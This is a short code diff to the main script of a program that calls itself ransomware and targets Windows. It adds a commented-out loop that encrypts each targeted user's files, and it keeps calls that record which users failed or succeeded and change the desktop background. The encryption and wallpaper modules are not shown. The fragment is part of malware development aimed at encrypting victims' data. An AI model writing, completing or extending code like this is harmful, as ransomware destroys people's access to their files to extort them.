@@ -13,7 +13,11 @@ if __name__ == "__main__":
     if sys.platform != 'win32':
         sys.exit('ERROR: Ransomware only supports windows.')
 
-    # Write the users that failed to encrypt and change the background.
+    # Write the users that failed and succeeded and change the background.
     files.write_users()
 
     background.changeBG(background.get_background())
+
+    # Encryption progress.
+    #for user in files.get_targeted_users():
+    #    crypter.encrypt_root(user)
